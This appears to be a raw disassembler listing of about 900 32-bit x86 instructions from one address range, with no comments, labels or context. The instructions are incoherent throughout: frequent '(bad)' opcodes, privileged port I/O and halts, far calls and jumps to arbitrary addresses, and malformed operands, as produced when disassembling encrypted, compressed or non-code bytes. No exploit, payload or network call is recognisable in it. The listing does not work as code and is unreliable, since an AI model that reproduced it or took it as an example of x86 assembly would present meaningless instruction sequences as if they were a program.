  41a9c9:	xor    al,0xc1
  41a9cb:	inc    DWORD PTR [edx]
  41a9cd:	test   DWORD PTR [edi],ebp
  41a9cf:	dec    ebx
  41a9d0:	pop    esi
  41a9d1:	int3   
  41a9d2:	aam    0x4b
  41a9d4:	stos   DWORD PTR es:[edi],eax
  41a9d5:	xlat   BYTE PTR ds:[ebx]
  41a9d6:	mov    edx,edx
  41a9d8:	iret   
  41a9d9:	fcomp  QWORD PTR [ebx]
  41a9db:	shl    eax,0xf
  41a9de:	shl    DWORD PTR [ecx+eax*4+0x23],1
  41a9e2:	shl    dl,cl
  41a9e4:	dec    ebp
  41a9e5:	jnp    0x41a991
  41a9e7:	adc    DWORD PTR [esi-0xb],esi
  41a9ea:	xor    DWORD PTR [esi+0x45],ebp
  41a9ed:	fimul  WORD PTR [ebp+0x72]
  41a9f0:	sar    bh,0x3a
  41a9f3:	ret    0xc007
  41a9f6:	mov    ds:0x9d5fa295,al
  41a9fb:	fisttp WORD PTR [ecx+0x1b]
  41a9fe:	out    0xdd,eax
  41aa00:	mov    dl,BYTE PTR [ebp+edi*4-0x6d]
  41aa04:	jmp    0xa6632917
  41aa09:	push   0x37
  41aa0b:	sbb    esp,eax
  41aa0d:	lds    edx,FWORD PTR [esi+edx*8]
  41aa10:	stos   DWORD PTR es:[edi],eax
  41aa11:	(bad)  
  41aa12:	cmp    bh,ch
  41aa14:	es out dx,eax
  41aa16:	xchg   esp,eax
  41aa17:	pushf  
  41aa18:	sub    al,0x8e
  41aa1a:	push   ecx
  41aa1b:	adc    BYTE PTR [esi],dl
  41aa1d:	call   0xf783:0x8ee31978
  41aa24:	mov    al,ds:0x6a0e94bf
  41aa29:	mov    esi,0x96913462
  41aa2e:	cmp    esp,DWORD PTR [edx+eax*4-0x25e7895e]
  41aa35:	or     al,0x81
  41aa37:	mov    dl,0x67
  41aa39:	pop    ecx
  41aa3a:	fucomip st,st(3)
  41aa3c:	mov    al,ds:0x6885d3a
  41aa41:	fwait
  41aa42:	mov    edx,0xc2ecb2a1
  41aa47:	cmp    al,0xed
  41aa49:	dec    edx
  41aa4a:	rol    edi,0x7
  41aa4d:	das    
  41aa4e:	sub    eax,0xfcc44d90
  41aa53:	into   
  41aa54:	(bad)  
  41aa55:	ret    
  41aa56:	sbb    al,0xa2
  41aa58:	(bad)  [edx-0x77]
  41aa5b:	ins    DWORD PTR es:[edi],dx
  41aa5c:	int3   
  41aa5d:	pop    ds
  41aa5e:	mov    dl,0x69
  41aa60:	mov    eax,0x31676354
  41aa65:	int3   
  41aa66:	push   0x6b
  41aa68:	sub    eax,0x1a000337
  41aa6d:	push   0x42ba9ef6
  41aa72:	and    al,0x93
  41aa74:	push   edx
  41aa75:	xchg   esi,eax
  41aa76:	or     al,BYTE PTR [edi-0x252fc404]
  41aa7c:	inc    edi
  41aa7d:	jl     0x41aaf6
  41aa7f:	pop    edx
  41aa80:	sar    DWORD PTR [esi-0x2],cl
  41aa83:	add    al,0xb2
  41aa85:	sub    eax,0xb3e8a35
  41aa8a:	lods   eax,DWORD PTR ds:[esi]
  41aa8b:	xchg   edx,eax
  41aa8c:	leave  
  41aa8d:	mov    al,0xb8
  41aa8f:	fcomp  DWORD PTR [edi]
  41aa91:	mov    ?,WORD PTR [edx]
  41aa93:	jno    0x41aa32
  41aa95:	add    BYTE PTR [edi-0x3c],cl
  41aa98:	idiv   DWORD PTR [esi]
  41aa9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa9b:	sbb    dh,dh
  41aa9d:	push   esi
  41aa9e:	std    
  41aa9f:	and    DWORD PTR [ecx+esi*4+0x36],esi
  41aaa3:	loopne 0x41aa27
  41aaa5:	out    0x7d,al
  41aaa7:	sub    edi,DWORD PTR [ebx]
  41aaa9:	sbb    al,0x5
  41aaab:	jne    0x41aacc
  41aaad:	jne    0x41aafe
  41aaaf:	ins    BYTE PTR es:[edi],dx
  41aab0:	mov    eax,ds:0xe2231e9
  41aab5:	xchg   ecx,eax
  41aab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aab7:	and    edi,eax
  41aab9:	cli    
  41aaba:	or     eax,0x5b76bfb2
  41aabf:	add    ebx,DWORD PTR [esi+ecx*1+0x2c]
  41aac3:	xor    BYTE PTR [esi],ch
  41aac5:	in     al,0x8
  41aac7:	hlt    
  41aac8:	test   DWORD PTR [esi-0x37],esi
  41aacb:	out    0xd4,al
  41aacd:	mov    bl,0xd0
  41aacf:	and    al,0x3d
  41aad1:	inc    esp
  41aad2:	hlt    
  41aad3:	jg     0x41ab44
  41aad5:	and    dl,BYTE PTR [edx+0x30]
  41aad8:	dec    esi
  41aad9:	dec    esp
  41aada:	(bad)  
  41aadb:	jno    0x41ab0f
  41aadd:	daa    
  41aade:	adc    DWORD PTR [edx],edi
  41aae0:	inc    esp
  41aae1:	pop    eax
  41aae2:	in     eax,dx
  41aae3:	jmp    0x41aa90
  41aae5:	(bad)  
  41aae6:	adc    al,0x3a
  41aae8:	jp     0x41ab3d
  41aaea:	icebp  
  41aaeb:	jb     0x41ab23
  41aaed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaee:	sub    BYTE PTR [edi-0x6e],0xc7
  41aaf2:	hlt    
  41aaf3:	call   0x6d81:0xbcca3c47
  41aafa:	repnz and eax,0xc2f84c7f
  41ab00:	ret    
  41ab01:	sbb    al,0x55
  41ab03:	mov    eax,0x63b0acb9
  41ab08:	mov    esi,0xd8ec98a2
  41ab0d:	loop   0x41ab57
  41ab0f:	pop    ss
  41ab10:	int    0x6b
  41ab12:	test   BYTE PTR [ecx],dh
  41ab14:	cmp    al,0xd0
  41ab16:	mov    ah,0x90
  41ab18:	cmp    ah,BYTE PTR [eax]
  41ab1a:	mov    DWORD PTR ds:0x1d0dff9,ebx
  41ab20:	push   ds
  41ab21:	pop    ds
  41ab22:	or     eax,0x2a89c772
  41ab27:	test   al,0x36
  41ab29:	and    al,BYTE PTR [esi-0x8]
  41ab2c:	pop    es
  41ab2d:	sub    dh,ch
  41ab2f:	test   al,0x1
  41ab31:	mov    cl,0xb5
  41ab33:	aad    0x62
  41ab35:	and    eax,0xb9227146
  41ab3a:	lock out 0xf6,eax
  41ab3d:	or     DWORD PTR [edx-0x4bfdfff],0xffffffab
  41ab44:	outs   dx,BYTE PTR ds:[esi]
  41ab45:	mov    eax,0x3788d69a
  41ab4a:	mov    dl,0x39
  41ab4c:	mov    al,BYTE PTR [eax]
  41ab4e:	shr    BYTE PTR [edi-0x1a362a8f],0x6f
  41ab55:	test   al,0xba
  41ab57:	add    ah,BYTE PTR [ebx]
  41ab59:	mov    esp,0x8b3c784f
  41ab5e:	sbb    bh,BYTE PTR fs:[eax+ebx*1+0x37423145]
  41ab66:	fidivr WORD PTR [ebp+0x2b431245]
  41ab6c:	mov    dl,0x28
  41ab6e:	xchg   edi,eax
  41ab6f:	std    
  41ab70:	ror    DWORD PTR [eax+0x6aa2b63d],0x45
  41ab77:	push   0x4e
  41ab79:	ret    0x75ee
  41ab7c:	ffreep st(1)
  41ab7e:	pinsrw mm5,WORD PTR [ebx-0x29],0xa1
  41ab83:	imul   eax,DWORD PTR [ebp-0x6549b792],0x50674f6f
  41ab8d:	cmp    ch,BYTE PTR [edi+0x36]
  41ab90:	add    DWORD PTR [edi+ebx*4+0x59],edx
  41ab94:	retf   
  41ab95:	xchg   esi,eax
  41ab96:	in     eax,0xc4
  41ab98:	js     0x41aba0
  41ab9a:	pop    edi
  41ab9b:	das    
  41ab9c:	out    0xb4,eax
  41ab9e:	arpl   WORD PTR [edx-0x1ef4e7a2],dx
  41aba4:	adc    bl,BYTE PTR [ebx-0x3421e142]
  41abaa:	aad    0x6
  41abac:	repnz xor BYTE PTR [ecx+esi*1],dh
  41abb0:	pop    ds
  41abb1:	xor    esp,DWORD PTR [ebx+0x3027e0ae]
  41abb7:	xchg   ebp,eax
  41abb8:	cmp    eax,0x3531e06d
  41abbd:	jmp    0xc092078f
  41abc2:	pop    ds
  41abc3:	adc    DWORD PTR [esp+ecx*2-0x7ee7c7ef],ecx
  41abca:	push   eax
  41abcb:	xchg   ecx,eax
  41abcc:	mov    bx,0xf8d2
  41abd0:	push   cs
  41abd1:	or     al,BYTE PTR [ecx+0x79877590]
  41abd7:	call   0x2d94:0x2ceec422
  41abde:	push   es
  41abdf:	push   esi
  41abe0:	xchg   esp,eax
  41abe1:	and    DWORD PTR [esi+0x12],esi
  41abe4:	lahf   
  41abe5:	fwait
  41abe6:	out    0x2a,al
  41abe8:	add    eax,0x47aba60
  41abed:	mov    eax,0xe336aa00
  41abf2:	fwait
  41abf3:	pop    eax
  41abf4:	call   0x4d6b710e
  41abf9:	rcl    BYTE PTR ds:0xeeaa09bc,1
  41abff:	aas    
  41ac00:	push   cs
  41ac01:	mov    edx,0x24245900
  41ac06:	(bad)  [eax-0x79823c4d]
  41ac0c:	outs   dx,DWORD PTR ds:[esi]
  41ac0d:	pop    ss
  41ac0e:	iret   
  41ac0f:	lock dec ecx
  41ac11:	push   0x836caeb0
  41ac16:	ret    0x6e89
  41ac19:	pop    ss
  41ac1a:	mov    esi,0xe6cd3189
  41ac1f:	les    eax,FWORD PTR [edi]
  41ac21:	fwait
  41ac22:	pop    es
  41ac23:	cmp    eax,0xe4afaf78
  41ac28:	pop    ebx
  41ac2a:	mov    dl,0x1e
  41ac2c:	nop
  41ac2d:	and    ch,0xb3
  41ac30:	push   esp
  41ac31:	inc    ebx
  41ac32:	xor    eax,0xdf23ad7e
  41ac37:	jns    0x41ac98
  41ac39:	xor    BYTE PTR [eax+0x39],0x91
  41ac3d:	ret    
  41ac3e:	inc    edi
  41ac3f:	push   esp
  41ac40:	pop    esi
  41ac41:	sub    al,0x12
  41ac43:	ja     0x41ac11
  41ac45:	sbb    al,0xe4
  41ac47:	call   0x147b:0xd8577f23
  41ac4e:	mov    esi,0xdff47ffc
  41ac53:	xor    cl,BYTE PTR [esp+esi*1-0x1c]
  41ac57:	mov    ch,0x8f
  41ac59:	jne    0x41ac82
  41ac5b:	sub    DWORD PTR [ebp+0x74672da7],ebx
  41ac61:	inc    BYTE PTR [ebx]
  41ac63:	push   eax
  41ac64:	mov    ebx,0xec8f2e41
  41ac69:	and    al,ch
  41ac6b:	fdivr  QWORD PTR [ebp+0xc]
  41ac6e:	retf   
  41ac6f:	jle    0x41acb9
  41ac71:	or     ch,BYTE PTR [eax-0x3aa32eb6]
  41ac77:	out    dx,eax
  41ac78:	es add ebp,edx
  41ac7b:	bound  edx,QWORD PTR [edx-0x73]
  41ac7e:	mov    bh,0xc6
  41ac80:	sub    BYTE PTR [esi+edx*4-0x24],ah
  41ac84:	out    0xfd,eax
  41ac86:	sbb    DWORD PTR [edi+0x6e0d766b],edi
  41ac8c:	dec    esp
  41ac8d:	outs   dx,DWORD PTR ds:[esi]
  41ac8e:	pop    eax
  41ac8f:	int3   
  41ac90:	adc    eax,0xbe127dad
  41ac95:	adc    al,0x28
  41ac97:	sub    al,0x1
  41ac99:	jae    0x41ac85
  41ac9b:	(bad)  
  41ac9c:	mov    ecx,0xb0e11b9f
  41aca1:	cwde   
  41aca2:	jmp    0x41aca6
  41aca4:	repz dec ebx
  41aca6:	call   0xbe6a:0x9aaa0f2d
  41acad:	or     al,0xd
  41acaf:	js     0x41ad26
  41acb1:	adc    eax,0x20e44d3c
  41acb6:	scas   al,BYTE PTR es:[edi]
  41acb7:	mov    esi,0x796d86ed
  41acbc:	ins    BYTE PTR es:[edi],dx
  41acbd:	sbb    ebp,DWORD PTR [edx+0x4db6f16a]
  41acc3:	pop    esp
  41acc4:	aaa    
  41acc5:	inc    ebp
  41acc6:	jno    0x41acdd
  41acc8:	dec    ebx
  41acc9:	in     al,0x5f
  41accb:	fiadd  WORD PTR [esi]
  41accd:	push   ecx
  41acce:	jecxz  0x41ad0c
  41acd0:	ja     0x41ace2
  41acd2:	xchg   ebp,eax
  41acd3:	xchg   edi,eax
  41acd4:	sbb    al,BYTE PTR ds:0x5428f8c9
  41acda:	cmp    ah,bl
  41acdc:	push   0xe3fce278
  41ace1:	inc    ebp
  41ace2:	call   0x4b58:0xd6ad457a
  41ace9:	add    edi,ebx
  41aceb:	arpl   WORD PTR [edx-0x60],ax
  41acee:	cld    
  41acef:	mov    dh,0x40
  41acf1:	cmp    al,0x31
  41acf3:	add    BYTE PTR [ecx-0x67],bl
  41acf6:	pop    edx
  41acf7:	mov    fs,esi
  41acf9:	int3   
  41acfa:	repnz push ecx
  41acfc:	mov    cl,0xa7
  41acfe:	sub    ah,ah
  41ad00:	retf   
  41ad01:	bound  eax,QWORD PTR [edx]
  41ad03:	aam    0xb
  41ad05:	xchg   esp,eax
  41ad06:	cmp    BYTE PTR [edx-0x22],al
  41ad09:	shl    BYTE PTR [esp+esi*8-0x64d475e0],cl
  41ad10:	inc    ecx
  41ad11:	adc    edi,DWORD PTR [eax]
  41ad13:	and    eax,0x4c8e5562
  41ad18:	cmp    al,BYTE PTR [edx+ebp*8-0x16635646]
  41ad1f:	inc    ecx
  41ad20:	or     bh,0xbd
  41ad23:	out    dx,eax
  41ad24:	(bad)  
  41ad25:	mov    eax,ds:0x63e98536
  41ad2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad2b:	les    eax,FWORD PTR [eax+0x4cb628b6]
  41ad31:	mov    eax,ds:0x1c1799d2
  41ad36:	(bad)  
  41ad37:	outs   dx,DWORD PTR ds:[esi]
  41ad38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad39:	ins    BYTE PTR es:[edi],dx
  41ad3a:	(bad)  
  41ad3b:	in     al,dx
  41ad3c:	ja     0x41adb0
  41ad3e:	cmovl  esp,ecx
  41ad41:	pop    ecx
  41ad42:	(bad)  
  41ad43:	or     al,0xd4
  41ad45:	jecxz  0x41ad61
  41ad47:	pop    eax
  41ad48:	adc    ah,ch
  41ad4a:	loop   0x41acee
  41ad4c:	push   esi
  41ad4d:	or     ecx,eax
  41ad4f:	call   0x404ac75e
  41ad54:	dec    edi
  41ad55:	fnstsw WORD PTR [esi+esi*4-0xe]
  41ad59:	pushf  
  41ad5a:	ficomp WORD PTR [ebx]
  41ad5c:	call   0x5a2c5a96
  41ad61:	or     edi,DWORD PTR [edi]
  41ad63:	mov    esi,0x696d75ce
  41ad68:	adc    eax,0x910dd02c
  41ad6d:	xor    ecx,DWORD PTR [edx]
  41ad6f:	pop    esi
  41ad70:	jmp    0xe765:0x583f5893
  41ad77:	cmp    al,0x1c
  41ad79:	add    al,0xac
  41ad7b:	xchg   ebx,eax
  41ad7c:	xabort 0x75
  41ad7f:	sti    
  41ad80:	adc    bl,al
  41ad82:	inc    edx
  41ad83:	sub    BYTE PTR [ebx+eiz*4+0x6d28149b],cl
  41ad8a:	je     0x41adb0
  41ad8c:	data16 cli 
  41ad8e:	push   es
  41ad8f:	mov    ah,0x1b
  41ad91:	dec    ecx
  41ad92:	test   al,0x14
  41ad94:	jbe    0x41adeb
  41ad96:	nop
  41ad97:	push   ecx
  41ad98:	xchg   ebp,eax
  41ad99:	mov    ebx,ebp
  41ad9b:	sub    eax,0xc35306ba
  41ada0:	adc    BYTE PTR [ecx],al
  41ada2:	cmp    DWORD PTR [esp+eax*2+0x62f8ad5],edi
  41ada9:	inc    ebx
  41adaa:	and    dh,0x61
  41adad:	pushf  
  41adae:	fiadd  WORD PTR [ebp+ecx*2-0x2c]
  41adb2:	adc    DWORD PTR [esi],ebx
  41adb4:	cmp    edx,ebp
  41adb6:	sbb    BYTE PTR [ecx+0x9],al
  41adb9:	cmp    eax,0xfb74b0bb
  41adbe:	leave  
  41adbf:	gs cld 
  41adc1:	jmp    0x41ada0
  41adc3:	(bad)  
  41adc4:	cs inc esp
  41adc6:	lds    edi,FWORD PTR [ecx+0x59]
  41adc9:	retf   
  41adca:	rcl    bh,0x7a
  41adcd:	(bad)  
  41adce:	(bad)  
  41adcf:	mov    ds,WORD PTR ds:0x9de17cea
  41add5:	ins    DWORD PTR es:[edi],dx
  41add6:	out    0xd8,al
  41add8:	or     DWORD PTR [ecx-0x69de314],0x4b2846c1
  41ade2:	lods   eax,DWORD PTR ds:[esi]
  41ade3:	cs popf 
  41ade5:	ds dec ebx
  41ade7:	cli    
  41ade8:	sub    al,0xba
  41adea:	mov    esp,0x395001fb
  41adef:	aam    0x8d
  41adf1:	or     eax,0xe83f7905
  41adf6:	xchg   edx,eax
  41adf7:	push   cs
  41adf8:	push   0x98863264
  41adfd:	pop    ds
  41adfe:	xchg   edx,eax
  41adff:	cs jae 0x41adfd
  41ae02:	outs   dx,DWORD PTR ds:[esi]
  41ae03:	mov    al,BYTE PTR ds:0x5ff89430
  41ae09:	cmp    ebp,edx
  41ae0b:	add    BYTE PTR [edi],ah
  41ae0d:	inc    edi
  41ae0e:	aas    
  41ae0f:	cwde   
  41ae10:	ss or  al,0x42
  41ae13:	cmp    DWORD PTR [ecx+ebp*8-0x49],ebp
  41ae17:	ret    0x7a44
  41ae1a:	cmp    al,0x29
  41ae1c:	adc    DWORD PTR [ebx],ecx
  41ae1e:	jp     0x41ae19
  41ae20:	mov    eax,0x1b9d303c
  41ae25:	(bad)  
  41ae26:	(bad)  
  41ae27:	into   
  41ae28:	ror    BYTE PTR [ebx+0x2c],0x53
  41ae2c:	cmp    dl,BYTE PTR [edi+0x3013ad5d]
  41ae32:	add    al,0x73
  41ae34:	stos   DWORD PTR es:[edi],eax
  41ae35:	lods   eax,DWORD PTR ds:[esi]
  41ae36:	out    dx,eax
  41ae37:	mov    WORD PTR [ebx],ss
  41ae39:	lds    esi,FWORD PTR [esi-0xaeb5217]
  41ae3f:	mov    ?,WORD PTR [ecx+0x48]
  41ae42:	jmp    0x41ae1f
  41ae44:	xchg   esp,eax
  41ae45:	fisubr DWORD PTR [esi-0x2aa9257e]
  41ae4b:	mov    edx,?
  41ae4d:	es mov bh,0x94
  41ae50:	push   0xffffffa9
  41ae52:	ss mov bl,0x9
  41ae55:	sar    BYTE PTR [esi+0x41405d37],1
  41ae5b:	jg     0x41ae2b
  41ae5d:	xor    ecx,DWORD PTR [esi+0x62762b22]
  41ae63:	xchg   ecx,eax
  41ae64:	jbe    0x41ade6
  41ae66:	xor    DWORD PTR [eax],eax
  41ae68:	je     0x41adff
  41ae6a:	push   ss
  41ae6b:	xchg   ecx,eax
  41ae6c:	out    dx,al
  41ae6d:	jl     0x41aeb1
  41ae6f:	lock jecxz 0x41ae7d
  41ae72:	ins    DWORD PTR es:[edi],dx
  41ae73:	sar    DWORD PTR [esi+0x49ffb39d],0x12
  41ae7a:	dec    edi
  41ae7b:	dec    esi
  41ae7c:	jno    0x41ae41
  41ae7e:	or     al,0x90
  41ae80:	add    esi,DWORD PTR [ebx]
  41ae82:	aas    
  41ae83:	imul   esi,DWORD PTR [eax+0x6d61100d],0x3c42f639
  41ae8d:	adc    eax,0x68505bf4
  41ae92:	stos   BYTE PTR es:[edi],al
  41ae93:	and    edi,edx
  41ae95:	mov    ecx,0x663907dc
  41ae9a:	pop    esi
  41ae9b:	cmp    al,BYTE PTR [ebx+ebp*1]
  41ae9e:	je     0x41aeda
  41aea0:	addr16 inc eax
  41aea2:	mov    ah,0x5e
  41aea4:	pushf  
  41aea5:	pop    ecx
  41aea6:	fs in  al,dx
  41aea8:	pop    edi
  41aea9:	(bad)  
  41aeaa:	loope  0x41ae8e
  41aeac:	ret    0x73c7
  41aeaf:	add    al,0x88
  41aeb1:	and    eax,0xe32c28e
  41aeb6:	fadd   QWORD PTR [edi+0x38]
  41aeb9:	jno    0x41aefe
  41aebb:	cmovne eax,esp
  41aebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aebf:	sub    BYTE PTR [ecx+ecx*1],bh
  41aec2:	out    dx,eax
  41aec3:	and    eax,esp
  41aec5:	pop    ss
  41aec6:	pop    ds
  41aec7:	jae    0x41af26
  41aec9:	inc    esi
  41aeca:	pop    esp
  41aecb:	leave  
  41aecc:	jle    0x41aefa
  41aece:	loop   0x41aeca
  41aed0:	es in  eax,dx
  41aed2:	lock pop ebx
  41aed4:	lea    edi,[edi+esi*2+0x48]
  41aed8:	mov    ah,ah
  41aeda:	inc    edi
  41aedb:	cmp    eax,0x6c94c163
  41aee0:	pop    edx
  41aee1:	jg     0x41ae98
  41aee3:	cmc    
  41aee4:	jne    0x41aec2
  41aee6:	cmp    al,0xd1
  41aee8:	lds    edi,FWORD PTR [ecx]
  41aeea:	xchg   esp,eax
  41aeeb:	ja     0x41aee8
  41aeed:	sub    eax,0x7760e603
  41aef2:	into   
  41aef3:	sub    bl,BYTE PTR [edi-0x5f3c3d92]
  41aef9:	mov    al,0xb8
  41aefb:	mov    ebp,0xf1c1a67c
  41af00:	scas   al,BYTE PTR es:[edi]
  41af01:	lods   al,BYTE PTR ds:[esi]
  41af02:	call   0x5d7:0x767e02a5
  41af09:	ret    
  41af0a:	dec    edx
  41af0b:	outs   dx,DWORD PTR ds:[esi]
  41af0c:	sub    al,0x92
  41af0e:	dec    esp
  41af0f:	es retf 0x3380
  41af13:	stos   BYTE PTR es:[edi],al
  41af14:	pop    edi
  41af15:	or     al,0xb
  41af17:	or     al,0x1
  41af19:	lods   al,BYTE PTR ds:[esi]
  41af1a:	outs   dx,DWORD PTR ds:[esi]
  41af1b:	xchg   edx,eax
  41af1c:	or     eax,0xed4567a2
  41af21:	jge    0x41af7b
  41af23:	cmp    esi,DWORD PTR [ebx+ebp*2]
  41af26:	sub    DWORD PTR [ecx-0x2e],ecx
  41af29:	inc    esp
  41af2a:	adc    al,0x16
  41af2c:	fmulp  st(1),st
  41af2e:	call   0x20809fd1
  41af33:	mov    dl,0xe3
  41af35:	call   0x7bfc:0xc36bcd04
  41af3c:	mov    WORD PTR [edi+0x1ad4113a],ss
  41af42:	iret   
  41af43:	icebp  
  41af44:	pop    ecx
  41af45:	inc    ecx
  41af46:	sub    al,0xb7
  41af48:	jns    0x41af11
  41af4a:	xor    dh,BYTE PTR [ebx-0x1373b2b5]
  41af50:	xchg   ecx,eax
  41af51:	pusha  
  41af52:	xchg   ecx,eax
  41af53:	adc    DWORD PTR fs:[ebx-0xe3372a0],edi
  41af5a:	cld    
  41af5b:	std    
  41af5c:	sub    edi,esi
  41af5e:	adc    DWORD PTR [eax+0x77034b73],ebp
  41af64:	lds    ebp,FWORD PTR [esi+edx*1-0x5b826734]
  41af6b:	pop    ebx
  41af6c:	or     al,al
  41af6e:	jp     0x41afe4
  41af70:	inc    ebx
  41af71:	shl    BYTE PTR [esi],1
  41af73:	(bad)  
  41af74:	nop
  41af75:	mov    DWORD PTR [esi*4-0x30c93096],ebx
  41af7c:	addr16 in al,dx
  41af7e:	sbb    esi,DWORD PTR [ebx-0x3d]
  41af81:	mov    ebx,0x89b9bf25
  41af86:	add    ch,BYTE PTR [ecx-0x13f46095]
  41af8c:	cli    
  41af8d:	xor    DWORD PTR [ecx-0x7dece0f3],esi
  41af93:	jl     0x41af88
  41af95:	inc    ecx
  41af96:	jns    0x41b008
  41af98:	retf   
  41af99:	fcomp  QWORD PTR [esi]
  41af9b:	(bad)  
  41af9c:	test   al,0x82
  41af9e:	(bad)  
  41af9f:	xchg   esi,eax
  41afa0:	or     DWORD PTR [edi],edi
  41afa2:	loop   0x41afa1
  41afa4:	mov    ds,WORD PTR [ebx]
  41afa6:	aas    
  41afa7:	and    ah,BYTE PTR [edi+0x54]
  41afaa:	mov    eax,0xe298a9c1
  41afaf:	sbb    eax,DWORD PTR [edi+eax*8]
  41afb2:	jae    0x41af4b
  41afb4:	dec    eax
  41afb5:	(bad)  
  41afb6:	and    BYTE PTR ds:0xa24b95cc,bl
  41afbc:	jo     0x41afcd
  41afbe:	mov    cl,0xee
  41afc0:	xchg   edx,eax
  41afc1:	rcr    dl,cl
  41afc3:	mov    edi,0xa04ce43c
  41afc8:	js     0x41af8c
  41afca:	mov    eax,ds:0x3b225088
  41afcf:	mov    edi,0x8b080214
  41afd4:	retf   0xcdcf
  41afd7:	stc    
  41afd8:	sub    DWORD PTR [esi-0x4b5cdd64],0x62
  41afdf:	xchg   ebp,edx
  41afe1:	sti    
  41afe2:	arpl   WORD PTR [eax-0x4],bp
  41afe5:	test   BYTE PTR [edi+ecx*4+0x72c09bf1],dl
  41afec:	in     al,0x1f
  41afee:	adc    DWORD PTR [esi+esi*1-0x342de0ac],0x55615b96
  41aff9:	sub    BYTE PTR [ecx+0x7d],bl
  41affc:	dec    ecx
  41affd:	pop    eax
  41affe:	call   0xf49a32a1
  41b003:	or     cl,dl
  41b005:	mov    ebx,DWORD PTR [edi+0xaa847e1]
  41b00b:	mov    esp,DWORD PTR [edi+0x66]
  41b00e:	rol    BYTE PTR [eax-0x66],0x5a
  41b012:	mov    ch,0x8d
  41b014:	jg     0x41b01a
  41b016:	shl    BYTE PTR [edi],0xee
  41b019:	int    0xfd
  41b01b:	imul   edx,DWORD PTR [edi+0x3cdfcbd6],0x7f3452fe
  41b025:	repz fstp TBYTE PTR [ebp-0x3747bde3]
  41b02c:	push   esp
  41b02d:	dec    ecx
  41b02e:	fldenv [ebp+0x3f5975ec]
  41b034:	and    eax,0xc2f5182b
  41b039:	in     eax,dx
  41b03a:	dec    ebp
  41b03b:	or     bh,BYTE PTR [ebp+edi*1-0x28e0770d]
  41b042:	cwde   
  41b043:	cmp    BYTE PTR [eax],0x7d
  41b046:	jge    0x41afc8
  41b048:	rol    DWORD PTR [ebp-0x576d412],0xfb
  41b04f:	mov    ds:0xa05bb90d,eax
  41b054:	cmp    eax,0xbb288364
  41b059:	pop    ss
  41b05a:	ss cdq 
  41b05c:	xchg   edi,eax
  41b05d:	jo     0x41b064
  41b05f:	mov    ds:0xb9cae00a,al
  41b064:	ds sahf 
  41b066:	mov    al,ds:0x40365db0
  41b06b:	cwde   
  41b06c:	shl    DWORD PTR [edi],1
  41b06e:	mov    cl,0x5e
  41b070:	jno    0x41b076
  41b072:	adc    edi,DWORD PTR [ecx-0x18]
  41b075:	add    eax,0x2eea4b8e
  41b07a:	sub    BYTE PTR [edx+0x6bc9bfb6],bh
  41b080:	mov    al,0xfa
  41b082:	shl    edx,0x27
  41b085:	inc    edi
  41b086:	fisttp QWORD PTR gs:[edx]
  41b089:	test   dl,bl
  41b08b:	inc    ebx
  41b08c:	in     al,0xde
  41b08e:	push   ebx
  41b08f:	jmp    0x41b075
  41b091:	push   edi
  41b092:	push   esi
  41b093:	xlat   BYTE PTR ds:[ebx]
  41b094:	jl     0x41b08b
  41b096:	dec    ecx
  41b097:	mov    esp,0xeb1d8834
  41b09c:	jnp    0x41b0e1
  41b09e:	mov    BYTE PTR [eax+ebp*1-0x39],al
  41b0a2:	dec    ebp
  41b0a3:	push   cs
  41b0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0a5:	mov    bl,0xad
  41b0a7:	inc    ebx
  41b0a8:	add    al,0xe4
  41b0aa:	retf   
  41b0ab:	rol    BYTE PTR [esi],0x99
  41b0ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0af:	mov    ch,0x36
  41b0b1:	inc    esp
  41b0b2:	js     0x41b0cd
  41b0b4:	dec    ebx
  41b0b5:	dec    edi
  41b0b6:	jg     0x41b049
  41b0b8:	std    
  41b0b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ba:	fld    TBYTE PTR [esi+0x7d57f6ed]
  41b0c0:	add    al,0x36
  41b0c2:	mov    cl,BYTE PTR [esi-0x72]
  41b0c5:	push   0x5f
  41b0c7:	mov    dh,BYTE PTR [edx+0x73c75b19]
  41b0cd:	mov    edx,0xabeb4b46
  41b0d2:	outs   dx,DWORD PTR ds:[esi]
  41b0d3:	inc    ebp
  41b0d4:	not    BYTE PTR [esi]
  41b0d6:	std    
  41b0d7:	ins    BYTE PTR es:[edi],dx
  41b0d8:	inc    esp
  41b0d9:	pop    ecx
  41b0da:	ds enter 0xd132,0x6d
  41b0df:	ss lock jmp 0x32e2:0xf743ba1c
  41b0e8:	fs iret 
  41b0ea:	cmp    ebp,esp
  41b0ec:	mov    dl,0xb1
  41b0ee:	adc    al,0x16
  41b0f0:	inc    esi
  41b0f1:	xchg   ebp,eax
  41b0f2:	push   0x17ecafc9
  41b0f7:	or     dh,BYTE PTR [eax-0x65]
  41b0fa:	push   ebp
  41b0fb:	sbb    al,0xa6
  41b0fd:	fwait
  41b0fe:	adc    eax,0x9ee71ca2
  41b103:	mov    ecx,0x4df50684
  41b108:	ins    DWORD PTR es:[edi],dx
  41b109:	pop    esi
  41b10a:	jle    0x41b0ab
  41b10c:	sbb    eax,0xb9fec16c
  41b111:	pop    ebx
  41b112:	(bad)  
  41b113:	int    0x49
  41b115:	addr16 push ds
  41b117:	ret    
  41b118:	lods   al,BYTE PTR ds:[esi]
  41b119:	in     eax,0x1f
  41b11b:	sti    
  41b11c:	das    
  41b11d:	fnstsw WORD PTR [ebp+0x130ac3fb]
  41b123:	ja     0x41b0bc
  41b125:	mov    BYTE PTR [ecx-0x55abebe8],cl
  41b12b:	es inc ecx
  41b12d:	xor    DWORD PTR [ebx+0x4aafdfc7],ebx
  41b133:	mov    ds:0xace9715f,eax
  41b138:	jns    0x41b129
  41b13a:	inc    esi
  41b13b:	ret    0xeb01
  41b13e:	jo     0x41b113
  41b140:	adc    eax,0xb0f358a0
  41b145:	xor    ah,BYTE PTR [edx]
  41b147:	mov    edi,0x99746f38
  41b14c:	sub    edx,DWORD PTR [edi+ebx*1]
  41b14f:	dec    eax
  41b150:	and    eax,0x94c75ca3
  41b155:	push   0xebc6941
  41b15a:	lahf   
  41b15b:	(bad)  
  41b15c:	(bad)  
  41b15d:	es and ah,dl
